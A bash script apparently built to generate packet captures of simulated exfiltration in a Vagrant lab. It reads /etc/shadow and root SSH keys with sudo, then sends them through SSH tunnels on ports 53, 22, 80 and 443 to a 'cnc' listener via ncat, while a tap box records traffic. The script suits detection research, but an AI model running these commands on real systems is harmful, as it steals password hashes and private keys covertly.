#!/bin/bash

# Global variables

PCAP_DIR="/vagrant/pcap"
SCRIPT_DIR="`pwd`/scripts"
SLEEP_INTERVAL='1'

# Tail this file to verify that data is being transfered
# --output or stdout of cnc listener should be redirected here
LOGFILE='/vagrant/test.log'

SSH_ARGS='-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'

MONITORING_BOX='tap'
SENDER_BOX='host'
LISTENER_BOX='cnc'

FILES=( '/etc/shadow' '/root/.ssh/id_rsa' '/root/.ssh/id_rsa.pub' )
PORTS=( '53' '22' '80' '443' )

IP_PROTOCOLS=( 't' 'u' )
IP_VERSIONS=( '4' '6' )

LISTENER_IP4='192.168.12.12'
LISTENER_IP6='2a02:1010:12::12'

TUN64_MODES=( 't6over4' 't6to4' 'isatap' )

# Common functions

die() { 
    echo "$@" 1>&2
    exit 1
}

SSH () {
    BOX=$1
    CMD=$2

    vagrant ssh $BOX -c "$CMD"

}

start_tcpdump_listener () {

    if [[ $# -ne 2 ]]; then
        die "Illegal number of arguments for tcpdump listener, must be 2"
    fi

    INTERFACE=$1
    PCAP_NAME=$2

    # Clean up any existing 
    kill_tcpdump_listener

    echo "Creating PCAP folder"
    SSH $MONITORING_BOX "sudo mkdir -p $PCAP_DIR"

    echo "starting tcpdump for $PCAP_NAME.pcap in folder $PCAP_DIR"
    SSH $MONITORING_BOX "nohup sudo tcpdump -i $INTERFACE -w $PCAP_DIR/$PCAP_NAME.pcap & sleep 1"

}

kill_tcpdump_listener () {
    echo "killing tcpdump"
    SSH $MONITORING_BOX "sudo pkill tcpdump"
    sleep $SLEEP_INTERVAL
}

send_files () {
    LISTEN_CMD=$1
    KILL_CMD=$3

    for file in "${FILES[@]}"; do

        SEND_CMD="sudo cat $file | $2"

        echo "Starting listener"
        echo "$LISTEN_CMD"
        SSH $LISTENER_BOX "$LISTEN_CMD"
        sleep $SLEEP_INTERVAL

        echo "Sending data"
        echo "$SEND_CMD"
        SSH $SENDER_BOX "$SEND_CMD"
        sleep $SLEEP_INTERVAL

        echo "Attempting to kill listener"
        echo "$KILL_CMD"
        SSH $LISTENER_BOX "$KILL_CMD"
        sleep $SLEEP_INTERVAL
    done
}

# SSH tunneling

iterate_ssh_tunnels () {
    for version in "${IP_VERSIONS[@]}"; do
        for port in "${PORTS[@]}"; do
        #echo "Initiating port $port test"

            case $version in
                4)
                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa $SSH_ARGS vagrant@$LISTENER_IP4 -L 4444:$LISTENER_IP4:4444 -N -f -p $port"
                LISTEN_DATA="ncat -4 -l -p 4444 -k -w 5 --output $LOGFILE"
                SEND_DATA="ncat 127.0.0.1 4444"
                ;;
                6)
                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa $SSH_ARGS -6 vagrant@$LISTENER_IP6 -L 6666:\[$LISTENER_IP6\]:6666 -N -f -p $port"
                LISTEN_DATA="ncat -6 -l -p 6666 -k -w 5 --output $LOGFILE"
                SEND_DATA="ncat -6 ::1 6666"
                ;;
                *)
                die "No IP version argument"
                ;;
            esac

            ITERATION_NAME="ssh-$version-$port"
            LISTEN_CMD="nohup sudo $LISTEN_DATA & sleep 1"
            SEND_CMD="sudo $SEND_DATA"
            KILL_CMD="sudo pkill ncat"

            echo "$ITERATION_NAME"
        
            # Cleanup just in case
            SSH $LISTENER_BOX "sudo pkill ncat"
            kill_tcpdump_listener
        
            reconfigure_ssh_listener add $port
            start_tcpdump_listener eth1 "$ITERATION_NAME"
        
            echo "Establishing SSH tunnel for iteration: $ITERATION_NAME"
            SSH $SENDER_BOX "sudo nohup $ESTABLISH" || die "Failed to establish ssh channel"

            send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
        
            echo "Cleaning up"
            SSH $LISTENER_BOX "sudo pkill ncat"
            SSH $SENDER_BOX "sudo ps -ef | egrep 'ssh.+id_rsa' | awk -F \" \" '{ print \$2 }' | sudo xargs kill"
            reconfigure_ssh_listener remove $port
            kill_tcpdump_listener
            sleep $SLEEP_INTERVAL

        done
    done
}

reconfigure_ssh_listener () {

    if [[ $# -ne 2 ]]; then
        die "Illegal number of arguments for reconfiguring ssh listener, must be 2"
    fi

    PORT=$2

    case $1 in
        add)
            reconfigure_ssh_listener remove $PORT
            echo "Adding SSH port $PORT listener"
            DO_CMD="sed -i -e \"\\\$a\\Port $PORT\" /etc/ssh/sshd_config"
            echo $DO_CMD
            SSH $LISTENER_BOX "sudo $DO_CMD"
        ;;
        remove)
            echo "Removing SSH port $PORT listener"
            SSH $LISTENER_BOX "sudo sed -i \"s/^Port $PORT.*//g\" /etc/ssh/sshd_config"
        ;;
        *)
        die "reconfigure_ssh_listener requires add|remove as first argument"
        ;;
    esac  

    echo "Restarting SSH service"
    SSH $LISTENER_BOX "sudo service ssh restart"
    sleep 1

}

# HTTP tunneling

#iterate_http_tunnels {
#    for port in "${PORTS[@]}"; do
#        LISTEN_DATA="hts $port -s"
#        SEND_DATA="htc -s LISTENER_IP4:$port"
#
#
#
#    done
#}

# MAIN
iterate_ssh_tunnels